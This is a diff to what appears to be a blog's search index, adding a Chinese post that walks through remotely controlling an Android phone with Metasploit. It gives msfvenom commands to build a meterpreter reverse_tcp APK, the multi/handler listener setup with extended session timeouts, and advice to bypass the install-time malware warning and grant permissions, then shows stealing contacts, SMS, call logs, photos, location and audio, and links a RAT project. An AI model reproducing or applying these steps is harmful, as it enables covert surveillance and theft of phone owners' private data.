@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>远控手机实验</title>
+      <link href="/posts/alfkfaqertqotlc/"/>
+      <url>/posts/alfkfaqertqotlc/</url>
+      
+        <content type="html"><![CDATA[<h2 id="准备木马"><a href="#准备木马" class="headerlink" title="准备木马"></a>准备木马</h2><p>我就用msf来做这个实验，首先venome生成安卓的小马，就选android/meterpreter/reverse_tcp这个，然后设置好LHOST</p><pre><code class="sh">msfvenome -l payloadsmsfvenome -p android/meterpreter/reverse_tcp LHOST=xxx LPORT=xxx R &gt; xxx.apk</code></pre><p>这个马到时候会反弹一个meterpreter回来，但是安装会报毒，所以我们安装的时候要把封锁解掉，同时要把他的后台运行等打开，再给权限。</p><p>github上面有马和服务端生成器的项目，但是我不建议用，因为安全性还是要画个大大的问号，如果有后门那就中大招了</p><ul><li><a href="https://github.com/AhMyth/AhMyth-Android-RAT">https://github.com/AhMyth/AhMyth-Android-RAT</a></li></ul><h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><p>msfconsole里面准备好，首先开启监听</p><pre><code class="sh">msfconsoleuse exploit/multi/handlerset payload android/meterpreter/reverse_tcpset LHOST xxxset SessionCommunicationTimeout 100000000 //连接无活动失效时间set SessionExpirationTimeout 100000000 //连接有效期</code></pre><p>设置好之后直接exploit</p><p>然后打开小马，接下来就会反弹到一个meterpreter</p><p><img src="/posts/alfkfaqertqotlc/1.png"></p><h2 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h2><p>可以做的事情太多了，就不废话了</p><p><img src="/posts/alfkfaqertqotlc/2.png"></p><h4 id="包括读取通讯录啊，短信啊，通话记录等等"><a href="#包括读取通讯录啊，短信啊，通话记录等等" class="headerlink" title="包括读取通讯录啊，短信啊，通话记录等等"></a>包括读取通讯录啊，短信啊，通话记录等等</h4><p><img src="/posts/alfkfaqertqotlc/4.png"></p><h4 id="拍摄照片"><a href="#拍摄照片" class="headerlink" title="拍摄照片"></a>拍摄照片</h4><p>拍近照有点糊</p><p><img src="/posts/alfkfaqertqotlc/3.png"></p><h4 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h4><p><img src="/posts/alfkfaqertqotlc/5.png"></p><h4 id="录音"><a href="#录音" class="headerlink" title="录音"></a>录音</h4><p><img src="/posts/alfkfaqertqotlc/6.png"></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>这还算是比较初级的实验，没有涉及到apk签名啊免杀啊乱七八糟的，威力凑合，不过msf的也不是很好用，容易断，如果要做一个的话还是需要自己改，配合组合拳来打，这种可以用在近源渗透上面的话还是不错的。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 移动 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【杂技篇】AI克隆人声</title>
       <link href="/posts/uiregisaaasfq/"/>
       <url>/posts/uiregisaaasfq/</url>
